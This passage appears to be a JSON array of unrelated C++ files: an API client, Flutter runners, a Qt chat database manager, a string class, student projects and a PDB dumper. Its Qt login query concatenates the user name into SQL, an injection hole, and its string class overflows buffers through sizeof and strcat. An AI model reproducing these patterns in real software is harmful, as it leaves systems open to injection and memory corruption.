this_thread::sleep_for(chrono::seconds(3));  // Wait a bit before rechecking\n    }\n\n    // Step 1: Send audio file to Whisper API to get the transcribed text\n    string response = sendAudioToWhisper(apiKey, audioFilePath);\n\n    // Parse the JSON response to extract the transcribed text\n    auto jsonResponse = nlohmann::json::parse(response);\n    string transcript = jsonResponse[\"text\"];\n\n    cout << \"Transcribed Text: \" << transcript << endl;\n\n    // Step 2: Send the transcribed text to GPT for further conversation\n    string gptResponse = sendTextToGPT(apiKey, transcript);\n\n    // Parse the JSON response from GPT\n    auto gptJsonResponse = nlohmann::json::parse(gptResponse);\n    string gptReply = gptJsonResponse[\"choices\"][0][\"message\"][\"content\"];\n\n    cout << \"GPT Response: \" << gptReply << endl;\n\n    // Step 3: Delete the audio file after processing\n    if (remove(audioFilePath.c_str()) == 0) {\n        cout << \"Audio file deleted successfully.\" << endl;\n    }\n    else {\n        cerr << \"Error deleting audio file!\" << endl;\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"adv_basics\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"databasemanager.h\"\n\n#include <QDebug>\n#include <QSqlQuery>\n\nDataBaseManager::DataBaseManager()\n{\n    m_users = QSqlDatabase::addDatabase(\"QSQLITE\", \"Usersdb\");\n    m_users.setDatabaseName(\"./../../Usersdb\");\n    m_messages = QSqlDatabase::addDatabase(\"QSQLITE\", \"Messagesdb\");\n    m_messages.setDatabaseName(\"./../../Messagesdb\");\n}\n\nbool DataBaseManager::tryLogin(QString name, QString password)\n{\n    m_users.open();\n    QSqlQuery getpass(\"SELECT Password FROM Users WHERE Name == '\" + name + \"'\",\n                      m_users);\n    if (getpass.exec())\n    {\n        getpass.next();\n        QString pass = getpass.value(0).toString();\n        if (!pass.isEmpty() && pass == password)\n        {\n            m_users.close();\n            return true;\n        }\n    }\n    else\n    {\n        qDebug() << \"Query error!\";\n    }\n    m_users.close();\n    return false;\n}\n\nbool DataBaseManager::tryRegistration(QString name, QString password)\n{\n    m_users.open();\n\n    QSqlQuery regist(m_users);\n    regist.prepare(\"INSERT INTO Users (Name, Password) VALUES(:name, :password)\");\n    regist.bindValue(\":name\", name);\n    regist.bindValue(\":password\", password);\n\n    bool isRegist = false;\n    qDebug() << \"Rgist\";\n    if (regist.exec())\n    {\n        qDebug() << 's';\n        isRegist = true;\n    }\n    else\n    {\n        qDebug() << \"Query error!\";\n    }\n\n    m_users.close();\n    return isRegist;\n}\n\nvoid DataBaseManager::addMessage(QString name, QString text)\n{\n    m_messages.open();\n    QSqlQuery addMessage(m_messages);\n    addMessage.prepare(\"INSERT INTO Messages(Name, Text) VALUES(:name, :text)\");\n    addMessage.bindValue(\":name\", name);\n    addMessage.bindValue(\":text\", text);\n\n    if (!addMessage.exec())\n    {\n        qDebug() << \"dbManager: Add Message error\";\n    }\n\n    m_messages.close();\n}\n\nQJsonArray DataBaseManager::get100Message()\n{\n    m_messages.open();\n    QSqlQuery getMessage(m_messages);\n    getMessage.prepare(\"SELECT Name, Text FROM Messages\");\n\n    QJsonArray messages;\n    if (getMessage.exec())\n    {\n        while (getMessage.next()) {\n            messages.append(getMessage.value(0).toString()\n                            + \":\\n\"\n                            + getMessage.value(1).toString()\n                            + \"\\n\");\n        }\n    }\n    else\n    {\n        qDebug() << \"Get message error\";\n\n    }\n\n    m_messages.close();\n    return messages;\n}\n",
    "#include <iostream>\n#include \"claseString.h\"\n\nmyString::myString(){\n    theString=NULL;\n    longitud=0;\n}\n\nmyString::myString(const char *str){\n    longitud=sizeof(str);\n    theString=new char[longitud];\n    strcpy(theString, str);\n}\n\nmyString::~myString(){\n    delete[]theString;\n}\n\nvoid myString::setString(const char *str){\n    longitud=sizeof(str);\n    if(theString)\n        delete[]theString;\n    theString = new char[longitud];\n    strcpy(theString, str);\n}\n\nmyString* myString::operator=(const char *str){\n    setString(str);\n    return this;\n}\n\r\nvoid imprimirString(myString &str){ std::cout<<str.theString<<std::endl; }\r\n\nchar* myString::getString(){\n    char* copia=new char[longitud];\n    strcpy(copia, theString);\n    return copia;\n}\r\n\nint myString::getLongitud(){ return longitud; }\r\n\r\nvoid myString::concatenarString(const char *str){ //hay un error oculto en esta funci\u00f3n\r\n    strcat(theString, str);\r\n}\n\nmyString* myString::operator+=(const char *str){\n    strcat(theString, str);\n    return this;\n}\n\nbool myString::estaVacio(){\n    return (theString)? true : false;\n}\n\nbool myString::sonIguales(const char *str){\n    int longitudStr=sizeof(str), i=0;\r\n    bool iguales=(longitudStr==longitud);\r\n    while(i<longitud&&iguales){\r\n        iguales=(theString[i]==str[i]);\r\n        i++;\r\n    }\n    return iguales;\n}\n\nbool myString::operator==(const char *str){\n    bool resultado=sonIguales(str);\r\n    return resultado;\n}\n\nint myString::encontrarSubString(const char *str){ //actualmente incompleta\n    int position=0;\n\n    return position;\n}\n",
    "#include<iostream>\r\n#include<string>\r\nusing namespace std;\r\nint n;\r\nclass book{\r\n    public:\r\n    int cost;\r\n    string tittle;\r\n    string author;\r\npublic:\r\n    void accept();\r\n    void display();\r\n    void assending();\r\n   void dessending();\r\n   void lessthan500();\r\n   void greaterthan500();\r\n   void witharray();\r\n   void withoutarray();\r\n   \r\n}b[100],c[100];\r\n\r\nvoid book::accept(){\r\n    cout<<\"\\nenter the tittle of book\";\r\n    cin>>tittle;\r\n    cout<<\"enter the author\";\r\n    cin>>author;\r\n    cout<<\"enter the cost\";\r\n    cin>>cost;\r\n    \r\n}\r\nvoid book::display(){\r\n \r\n        cout<<\"\\n\"<<tittle<<\"\\t\"<<author<<\"\\t\"<<cost;\r\n    }\r\n\r\n\r\nvoid book::assending(){\r\n    book t;  \r\n    for(int i=0;i<n;i++)\r\n    {\r\n        for(int j=i;j<n;j++)\r\n        {\r\n            if(b[i].cost>b[j].cost)\r\n            {\r\n             t=b[i];\r\n             b[i]=b[j];\r\n             b[j]=t;\r\n            }\r\n        \r\n    }\r\n        cout<<\"\\n\"<<b[i].tittle<<\"\\t\"<<b[i].author<<\"\\t\"<<b[i].cost;   \r\n    }\r\n}   \r\nvoid book::dessending(){\r\n    book t;\r\n    for(int i=0;i<n;i++)\r\n    {\r\n        for(int j=i;j<n;j++)\r\n        {\r\n            if(b[i].cost<b[j].cost)\r\n            {\r\n             t=b[j];\r\n             b[j]=b[i];\r\n             b[i]=t;\r\n            }\r\n        }\r\n    cout<<\"\\n\"<<b[i].tittle<<\"\\t\"<<b[i].author<<\"\\t\"<<b[i].cost;\r\n    }\r\n}\r\nvoid book:: lessthan500(){\r\nfor(int i=0;i<n;i++){\r\n    if(b[i].cost<500)\r\n    {\r\n      cout<<\"\\n\"<<b[i].tittle<<\"\\t\"<<b[i].author<<\"\\t\"<<b[i].cost;\r\n    }\r\n}\r\n}\r\nvoid book::greaterthan500(){\r\nint d=0;\r\nfor(int i=0;i<n;i++){\r\n    if(b[i].cost>500)\r\n    {\r\n      cout<<\"\\n\"<<b[i].tittle<<\"\\t\"<<b[i].author<<\"\\t\"<<b[i].cost;\r\n      d++;\r\n    }\r\n}\r\ncout<<\"\\ncount of books greter than 500\"<<d;\r\n}\r\n\r\nvoid book ::witharray(){\r\nint j=0;\r\nc[0]=b[0];\r\nfor(int i=1;i<n;i++)\r\n{\r\n        if((b[i].tittle!=c[j].tittle) && (b[i].author!=c[j].author))\r\n        {\r\n            j++;\r\n            c[j]=b[i];\r\n        }\r\n    \r\n}\r\nfor(int i=0;i<=j;i++)\r\n{\r\n  cout<<\"\\n\"<<c[i].tittle<<\"\\t\"<<c[i].author<<\"\\t\"<<c[i].cost;  \r\n}\r\n}\r\nvoid book::withoutarray(){\r\nint j=0;\r\nfor(int i=0;i<n;i++)\r\n{\r\n        if(b[i].tittle!=b[j].tittle && b[i].author!=b[j].author)\r\n        {\r\n            j++;\r\n            b[j]=b[i];\r\n        }\r\n    \r\n}\r\nfor(int i=0;i<=j;i++)\r\n{\r\n  cout<<\"\\n\"<<b[i].tittle<<\"\\t\"<<b[i].author<<\"\\t\"<<b[i].cost;  \r\n}\r\n}\r\n\r\n\r\nint main(){\r\n    cout<<\"how many records you want to add\";\r\n    cin>>n;\r\n    int ch;\r\n    do{\r\n        cout<<\"\\n1.accept\\n2.display\\n3.assending\\n4.dessding\\n5.books less than 500\\n6.count of books greter than 5000\\n7.remove the duplicate enteries with array \\n8.remove duplicates without the extra array\\n9.end\"<<endl;\r\n        cout<<\"\\nwhich operation youo want to perform\"<<endl;\r\n        cin>>ch;\r\n        switch(ch){  \r\n            case 1:for(int i=0;i<n;i++){\r\n                b[i].accept();\r\n            }\r\n            break;\r\n            case 2:\r\n          \r\n            cout<<\"\\n\"<<\"title\"<<\"\\t\"<<\"author\"<<\"\\t\"<<\"cost\"<<endl;\r\n            for(int  i=0;i<n;i++){\r\n                b[i].display();\r\n            }  \r\n            break;\r\n            case 3:int i;\r\n                b[i].assending();\r\n                  break;\r\n                  case 4:b[i].dessending();\r\n                  break;\r\n                  case 5:b[i].lessthan500();\r\n                  break;\r\n                  case 6:b[i].greaterthan500();\r\n                  break;\r\n                  case 7:b[i].witharray();\r\n                  break;\r\n                   case 8:b[i].withoutarray();\r\n                   break;\r\n           case 9:cout<<\"existing\";\r\n            default:cout<<\"loop end\";     \r\n        }\r\n\r\n    }\r\n    while(ch!=9);\r\n}",
    "// main.cpp\n\n#include <Windows.h>\n#include <dia2.h>\n#include <atlbase.h> // For CComPtr\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n#include <cstdint> // For uintptr_t\n#include <sstream> // For std::wstringstream\n#include <iomanip> // For std::setprecision\n#include <mutex>   // For std::mutex\n\n// Include the nlohmann/json library\n#include \"json.hpp\"\n\nusing json = nlohmann::json;\n\n// Link against the DIA SDK library\n#pragma comment(lib, \"diaguids.lib\")\n\n// Function prototypes\nvoid EnumerateSymbols(CComPtr<IDiaSymbol> pGlobal, json& output, const std::wstring& filePrefix);\nvoid ProcessUDT(CComPtr<IDiaSymbol> pSymbol, json& classesArray, const std::wstring& filePrefix, LONG totalSymbols, LONG& processedSymbols, double& lastProgressPercentage);\nvoid ProcessEnum(CComPtr<IDiaSymbol> pSymbol, json& enumsArray, const std::wstring& filePrefix, LONG totalSymbols, LONG& processedSymbols, double& lastProgressPercentage);\nvoid ProcessTypedef(CComPtr<IDiaSymbol> pSymbol, json& typedefsArray, LONG totalSymbols, LONG& processedSymbols, double& lastProgressPercentage);\nvoid ProcessFunction(CComPtr<IDiaSymbol> pSymbol, json& functionsArray, const std::wstring& filePrefix, LONG totalSymbols, LONG& processedSymbols, double& lastProgressPercentage);\nvoid ProcessData(CComPtr<IDiaSymbol> pSymbol, json& globalsArray, const std::wstring& filePrefix, LONG totalSymbols, LONG& processedSymbols, double& lastProgressPercentage);\n\nstd::wstring GetSymbolName(CComPtr<IDiaSymbol> pSymbol);\nstd::wstring GetSymbolFileName(CComPtr<IDiaSymbol> pSymbol);\nDWORD GetSymbolLineNumber(CComPtr<IDiaSymbol> pSymbol);\nstd::wstring GetUndecoratedName(CComPtr<IDiaSymbol> pSymbol);\nstd::wstring GetTypeName(CComPtr<IDiaSymbol> pType);\nstd::wstring GetBasicTypeName(DWORD baseType, DWORD length);\n\nstd::string WStringToString(const std::wstring& wstr) {\n\tif (wstr.empty())\n\t\treturn std::string();\n\n\tint sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);\n\tif (sizeNeeded <= 0)\n\t\treturn std::string();\n\n\tstd::string strTo(sizeNeeded, 0);\n\tint bytesConverted = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &strTo[0], sizeNeeded, NULL, NULL);\n\tif (bytesConverted != sizeNeeded)\n\t\treturn std::string();\n\n\treturn strTo;\n}\n\n// Global type name cache to optimize GetTypeName function\nstd::unordered_map<ULONGLONG, std::wstring> typeNameCache;\nstd::mutex cacheMutex; // Mutex for thread-safe access to the cache (if multithreading is implemented)\n\nint wmain(int argc, wchar_t* argv[]) {\n\tif (argc < 2) {\n\t\tstd::wcerr << L\"Usage: DumpPDB.exe <path-to-pdb-file> [file-prefix]\" << std::endl;\n\t\treturn 1;\n\t}\n\n\t// Get the file prefix filter from command-line arguments\n\tstd::wstring filePrefix;\n\tif (argc >= 3) {\n\t\tfilePrefix = argv[2];\n\t}\n\n\t// Initialize COM library\n\tHRESULT hr = CoInitialize(NULL);\n\tif (FAILED(hr)) {\n\t\tstd::wcerr << L\"CoInitialize failed\" << std::endl;\n\t\treturn 1;\n\t}\n\n\tCComPtr<IDiaDataSource> pSource;\n\thr = CoCreateInstance(__uuidof(DiaSource), NULL, CLSCTX_INPROC_SERVER,\n\t\t__uuidof(IDiaDataSource), (void**)&pSource);\n\tif (FAILED(hr)) {\n\t\tstd::wcerr << L\"CoCreateInstance failed \" << std::hex << hr << std::endl;\n\t\tCoUninitialize();\n\t\treturn 1;\n\t}\n\n\t// Load the PDB file\n\thr = pSource->loadDataFromPdb(argv[1]);\n\tif (FAILED(hr)) {\n\t\tstd::wcerr << L\"loadDataFromPdb failed\" << std::endl;\n\t\tCoUninitialize();\n\t\treturn 1;\n\t}\n\n\tCComPtr<IDiaSession> pSession;\n\thr = pSource->openSession(&pSession);\n\tif (FAILED(hr)) {\n\t\tstd::wcerr << L\"openSession failed\" << std::endl;\n\t\tCoUninitialize();\n\t\treturn 1;\n\t}\n\n\tCComPtr<IDiaSymbol> pGlobal;\n\thr = pSession->get_globalScope(&pGlobal);\n\tif (FAILED(hr)) {\n\t\tstd::wcerr << L\"get_globalScope failed\" << std::endl;\n\t\tCoUninitialize();\n\t\treturn 1;\n\t}\n\n\t// Create JSON root object\n\tjson output;\n\n\t// Enumerate symbols\n\tEnumerateSymbols(pGlobal, output, filePrefix);\n\n\t// Output the JSON to a file\n\tstd::ofstream outFile(\"pdb_dump.json\");\n\toutFile << output.dump(2);\n\toutFile.close();\n\n\t// Reset console title\n\tSetConsoleTitle(L\"DumpPDB - Complete\");\n\n\tstd::wcout << L\"PDB information has been dumped to pdb_dump.json\" << std::endl;\n\n\tCoUninitialize();\n\treturn 0;\n}\n\nvoid EnumerateSymbols(CComPtr<IDiaSymbol> pGlobal, json& output, const std::wstring& filePrefix) {\n\tHRESULT hr;\n\tCComPtr<IDiaEnumSymbols> pEnumSymbols;\n\n\t// Prepare JSON arrays\n\tjson classesArray = json::array();\n\tjson enumsArray = json::array();\n\tjson globalsArray = json::array();\n\tjson functionsArray = json::array();\n\tjson typedefsArray = json::array();\n\n\t// Enumerate all symbols\n\thr = pGlobal->findChildren(SymTagNull, NULL, nsNone, &pEnumSymbols);\n\tif (FAILED(hr)) {\n\t\tstd::wcerr << L\"findChildren failed\" << std::endl;\n\t\treturn;\n\t}\n\n\tLONG totalSymbols = 0;\n\tpEnumSymbols->get_Count(&totalSymbols);\n\n\tCComPtr<IDiaSymbol> pSymbol;\n\tULONG celt = 0;\n\tLONG processedSymbols = 0;\n\tdouble lastProgressPercentage = -1.0; // Initialize to -1 to ensure the first update\n\n\twhile (SUCCEEDED(pEnu",
    "#include \"simple3d.hpp\"\n#include <thread>\n#include <sstream>\n#include <chrono>\n\nclass Portal {\npublic:\n    Transform mTransform;\n\n    Framebuffer mPortalFb;\n    Renderbuffer mPortalRb;\n    RMat lastView;\n\n    void Bind() {\n        lastView = _gView;\n        mPortalFb.Bind();\n        SetView(mTransform.GetPosition(), mTransform.GetPosition() + (RMat::RotateX(mTransform.GetRotation().x) * RMat::RotateY(mTransform.GetRotation().y) * RMat::RotateZ(mTransform.GetRotation().z) * RVec(0.0f, 0.0f, 1.0f)));\n    }\n\n    void MakeTexture(int width, int height) {\n        mPortalFb.Unbind();\n        mPortalRb.CreateStorage(&mPortalFb, width, height);\n        _gView = lastView;\n    }\n\n    void Render() {\n        RMat lastTf = _gTransform;\n        _gTransform = mTransform.GetTransform();\n\n        UseTexture(mPortalFb());\n        RenderSquare(RVec(), RVec(1.0f), RVec(1.0f));\n        UseTexture(&gWhite);\n\n        _gTransform = lastTf;\n    }\n\n    void Teleport(Portal* other, Particle* particle) {\n        if(AABBPointCollider(mTransform.GetPosition(), mTransform.GetScale(), particle->mPosition)) {\n            particle->mPosition = other->mTransform.GetPosition();\n        }\n    }\n};\n\nclass Wnd : public Window {\npublic:\n    Mesh map1;\n    std::vector<float> colors;\n    Texture map1Texture;\n    Particle player;\n    RVec playerSize = RVec(1.0f, 2.0f, 1.0f);\n    std::vector<RVec> shortestPoints;\n    std::vector<RVec> shortestPointsNormals;\n    bool physicsSwitch = false;\n\n    bool onGround = false;\n    const real playerWalk = 0.5;\n    const real playerSprint = 0.75;\n    const real playerJumpHeight = 4.9;\n\n    int fixedPerSec = 256;\n\n    void FixedUpdate() {\n        while(1) {\n            std::chrono::time_point start = std::chrono::high_resolution_clock::now();\n\n            double fixed_dt = 1.0 / (double)fixedPerSec;\n            if(physicsSwitch) {\n                player.Update(fixed_dt);\n            }\n\n            shortestPoints.clear();\n            shortestPointsNormals.clear();\n\n            RVec normal;\n\n            for(uint32_t i = 0; i < map1.mVertices.size() / 9; i++) {\n                RVec pt1 = mapTransform * RVec(map1.mVertices[i * 9 + 0], map1.mVertices[i * 9 + 1], map1.mVertices[i * 9 + 2]);\n                RVec pt2 = mapTransform * RVec(map1.mVertices[i * 9 + 3], map1.mVertices[i * 9 + 4], map1.mVertices[i * 9 + 5]);\n                RVec pt3 = mapTransform * RVec(map1.mVertices[i * 9 + 6], map1.mVertices[i * 9 + 7], map1.mVertices[i * 9 + 8]);\n\n                normal = RVec::PlaneNormal(pt1, pt2, pt3);\n                RVec point = PointOnPlane(player.mPosition, pt1, pt2, pt3);\n\n                if(point.w == 1.0f) {\n                    shortestPoints.push_back(point);\n                    shortestPointsNormals.push_back(normal);\n                }\n            }\n\n            onGround = false;\n\n            if(physicsSwitch) {\n                for(uint32_t i = 0; i < shortestPoints.size(); i++) {\n                    if(AABBPointCollider(RVec(player.mPosition.x, player.mPosition.y - playerSize.y, player.mPosition.z), RVec(0.2f), shortestPoints[i])) {\n                        onGround = true;\n                    }\n\n                    if(AABBPointCollider(player.mPosition, playerSize, shortestPoints[i])) {\n                        /*if(player.mPosition.y - (playerSize.y / 2.0) > shortestPoints[i].y) {\n                            onGround = true;\n                        }\n                        else {\n                            player.mVelocity -= shortestPointsNormals[i];\n                        }*/\n                        \n                        real px = shortestPoints[i].Distance(player.mPosition + RVec(playerSize.x));\n                        real py = shortestPoints[i].Distance(player.mPosition + RVec(playerSize.y));\n                        real pz = shortestPoints[i].Distance(player.mPosition + RVec(playerSize.z));\n                        real mx = shortestPoints[i].Distance(player.mPosition - RVec(playerSize.x));\n                        real my = shortestPoints[i].Distance(player.mPosition - RVec(playerSize.y));\n                        real mz = shortestPoints[i].Distance(player.mPosition - RVec(playerSize.z));\n\n                        real min = std::min(px, std::min(py, std::min(pz, std::min(mx, std::min(my, mz)))));\n\n                        player.ResolveCollision(shortestPointsNormals[i].Negate() * RVec(min) * fixed_dt);\n                    }\n                }\n            }\n\n            while(std::chrono::duration<double>(std::chrono::high_resolution_clock::now() - start).count() < fixed_dt) continue;\n        }\n    }\n\n    virtual void Start() override {\n        //player.mFriction = 0.1f;\n        //player.mHighFriction = 0.2f;\n        player.mDrag = 0.0001f;\n        player.mBounce = 0.1f;\n\n        std::jthread fixedThread(&Wnd::FixedUpdate, this);\n        fixedThread.detach();\n\n        map1 = LoadPLYMesh(\"map1.ply\");\n\n        colors.resize((map1.mVertices.size() / 3) * 4);\n        std::fill(colors.begin(), colors.end(",
    "#include <iostream>\n#include <cmath>\nusing namespace std;\nint main() {\n    cout << \"what type of equation will we solve?:\" << endl;\n    cout << \"1. ax^4 + bx^2 + c = 0\" << endl;\n    cout << \"2. ax^4 + bx^3 + cx^2 + bx + a = 0\" << endl;\n    cout <<\"3. x^3 + px + q = 0.\" << endl;\n    int number, a, b, c;\n    cin >> number;\n    if (number == 1) {\n        cout << \"enter a b c for an equation of the form ax^4 + bx^2 + c = 0\";\n        cin >> a >> b >> c;\n        float t1, t2, D, x1, x2, x_1, x_2;\n        D = b*b - 4 * a * c;\n        if ( D < 0) {\n            cout << \"No roots. Discriminant less than zero\";\n        }\n        else {\n            t1 = (( - b - (sqrt(D))) / (2 * a));\n            t2 = (( - b + sqrt(D)) / (2 * a));\n            cout << \"t1 is \" << t1 << \" t2 is \" << t2 << endl;\n            x1 = sqrt(t1);\n            x_1 = -sqrt(t1);\n            x_2 = -(sqrt(t2));\n            x2 = sqrt(t2);\n\n            cout << \"roots of the equation: \" << x1 << \" \"<< x_1 << \" \" << x2 << \" \" << x_2;\n        }\n    }\n    else if (number == 2) {\n        cout << \"enter a b c for an equation of the form aax^4 + bx^3 + cx^2 + bx + a = 0\";\n        cin >> a >> b >> c;\n        float t1, t2, D, x1, x2, x_1, x_2;\n        D = b * b - 4 * a * (- c - 2 * a);\n        if (D < 0) {\n            cout <<  \"No roots. Discriminant less than zero\";\n        }\n        else {\n            t1 = (- b - sqrt(D))/ (2 * a);\n            t2 = (( - b + sqrt(D)) / (2 * a));\n            cout << \"t1 is \" << t1 << \" t2 is \" << t2 << endl;\n            D = t1 * t1 -4;\n            if (D < 0) {\n                cout << \"No roots. Discriminant less than zero\";\n                }\n            else {\n                x1 = (-t1 - sqrt(D))/2;\n                x2 = (-t1 + sqrt(D))/2;\n            }\n            D = t2 * t2 -4;\n            if (D < 0) {\n                cout << \"No roots. Discriminant less than zero\";\n                }\n            else {\n                x_1 = (-t2 - sqrt(D))/2;\n                x_2 = (-t2 + sqrt(D))/2;\n            }\n            cout << x1 <<\" \"<< x2 <<\" \"<< x_1 <<\" \"<< x_2;\n\n        }\n\n    }\n    else if (number == 3) {\n\n    }\n    else {\n        cout << \"incorrect data entered\";\n    }\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"cleanArchitecture\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\n\nusing namespace std;\nint main() {\n    //Array 1D\n    int a[5] = {1,2,3,4,5};\n    cout << a[2] << endl ; //3\n    \n    //Array 2D\n    int b[2][3] = {{1,2,3},{4,5,6}} ;\n    cout << b[1][2] << endl ; //6\n    \n    //Vector 1D\n    vector<string> v1 = {\"hello\", \"world\"};\n    cout << v1[1] << endl ; //world\n    \n    vector<string> v2(5, \"default\");\n    cout << v2[3] << endl ; //default\n    \n    vector<int> v;\n    v.push_back(3);\n    v.push_back(5);\n    cout << v.size() << endl ;//2\n    cout << v[0] << endl ; //3\n    v.pop_back();\n    cout << v.size() << endl ;//1\n    v.clear();\n    cout << v.size() << endl ;//0\n    \n    //Vector 2D\n    vector<vector<int>> v2d = vector<vector<int>>(3, vector<int>(2,-1));\n    for(int i=0;i<3;i++){\n        for(int j=0;j<2;j++){\n            cout << v2d[i][j] << \" \" ;\n        }\n        cout << endl ;\n    }\n    \n    //Stack\n    stack<int> st ;\n    st.push(1);\n    st.push(2);\n    cout << st.top() << endl ; //2\n    st.pop();\n    cout << st.top() << endl ; //1\n    \n    //Queue\n    queue<int> q ;\n    q.push(1);\n    q.push(2);\n    cout << q.front() << endl ; //1\n    q.pop();\n    cout << q.front() << endl ; //2\n    \n    //Map\n    map<int, string> mp ;\n    mp[3] = \"suraj\" ;\n    mp[5] = \"patil\" ;\n    cout << mp[3] << endl ; //suraj\n    \n    map<int, string> ::iterator it;\n    for(it=mp.begin(); it != mp.end(); it++) {\n        cout << it->first << \" \" << it->second << endl ;\n    }\n    \n    if(mp.find(4) == mp.end()){\n        cout << \"4 no present\" << endl ; \n    }\n    \n    //Set\n    set<int> s ;\n    s.insert(2);\n    s.insert(3);\n    s.insert(2);\n    cout << s.size() << endl ; // 2\n    set<int> ::iterator sit ;\n    for(sit=s.begin();sit!=s.end();sit++){\n        cout << *sit << endl ;\n    }\n  \n    return 0;\n}\n",
    "#include \"function.h\"\n#include <iostream>\nvoid addStudent(std::vector<Student> &registru)\n{ \n    Student newStudent;\n    newStudent.studentID = registru.size();\n\n    std::cout << \"Da numele studentului nou \\n\";\n    std::cin >> newStudent.nume;\n    std::cout << \"Da prenumele studentului nou \\n\";\n    std::cin >> newStudent.prenume;\n\n    registru.push_back(newStudent);\n\n}\nvoid studentName(const std::vector<Student>& registru,int studentId)\n{\n   std::cout << registru[studentId].nume << ' ' << registru[studentId].prenume << '\\n';\n}\nvoid addPereche(std::vector<Student>& registru)\n{   int num = registru.size();\n    Disciplina newDisciplina;\n    std::cout << \"Da numele disciplinei noi \\n\";\n    std::cin >> newDisciplina.numePereche;\n    for (int iterator = 0; iterator < num; iterator++)\n    {\n        registru[iterator].discipline.push_back(newDisciplina);\n    }\n}\nvoid printDiscipline( const std::vector<Student>& registru)\n{\n    int num = registru[0].discipline.size();\n    for (int iterator = 0; iterator < num; iterator++)\n    {\n        std::cout << iterator << \". \" << registru[0].discipline[iterator].numePereche << '\\n';\n    }\n}\nvoid numeDiscipline(const std::vector<Student>& registru, int studentId,int disciplinaId)\n{\n    std::cout << registru[studentId].discipline[disciplinaId].numePereche << '\\n';\n}\nvoid addAbsenta(std::vector<Student> &registru, int studentId,int disciplinaId)\n{   std::string data;\n    std::cout << \"Da data in care a absentat \\n\";\n    std::cin.clear();\n    std::cin.ignore(INT_MAX,'\\n');\n    std::getline(std::cin,data);\n    registru[studentId].discipline[disciplinaId].absente.push_back(data);\n    registru[studentId].discipline[disciplinaId].numAbsente++;\n    registru[studentId].numAbsente++;\n}\nvoid printAbsente(const std::vector<Student> &registru,int studentId, int disciplinaId)\n{   std::cout << registru[studentId].discipline[disciplinaId].numAbsente+1 << \" absente \\n\";\n    int num = registru[studentId].discipline[disciplinaId].absente.size();\n    for (int iterator = 0; iterator < num; iterator++)\n    {\n        std::cout << iterator << \". \" << registru[studentId].discipline[disciplinaId].absente[iterator] << '\\n';\n    }\n    \n}\n\nvoid addMedie(std::vector<Student> &registru, int studentId,int disciplinaId)\n{\n    std::cout << \"Da media lui \" << registru[studentId].nume << ' ' << registru[studentId].prenume << \" la \" << registru[studentId].discipline[disciplinaId].numePereche << '\\n';\n    std::cin >> registru[studentId].discipline[disciplinaId].medie;\n\n    calcMedie(registru,studentId);\n}\nvoid printMedie(const std::vector<Student> &registru, int studentId,int disciplinaId)\n{\n    std::cout << registru[studentId].nume << ' ' << registru[studentId].prenume << \" are media: \" << registru[studentId].discipline[disciplinaId].medie << '\\n';\n}\nvoid calcMedie(std::vector<Student> &registru, int studentId)\n{\n    int max = registru[studentId].discipline.size();\n    double sum = 0;\n\n    for (int iterator = 0; iterator < max; iterator++)\n    {\n        sum += registru[studentId].discipline[iterator].medie;\n    }\n    registru[studentId].medie = sum / registru[studentId].discipline.size();\n    \n}\nvoid studentList(std::vector<Student> &registru)\n{\n   int max = registru.size();\n   for (int iterator = 0; iterator < max; iterator++)\n   {\n    std::cout << iterator << \". \";\n    studentName(registru,iterator);\n   }\n   \n\n}\n\nvoid highestMedie(const std::vector<Student> &registru)\n{\n    int iterator, ordHighest;\n    double bestMedie = 0;\n    for ( iterator = 0; iterator < registru.size(); iterator++)\n    {\n        if (registru[iterator].medie > bestMedie)\n        {\n            bestMedie = registru[iterator].medie;\n            ordHighest = iterator;\n        }\n        \n    }\n    studentName(registru,ordHighest);\n    std::cout << \"Are cea mai mare medie generala : \" 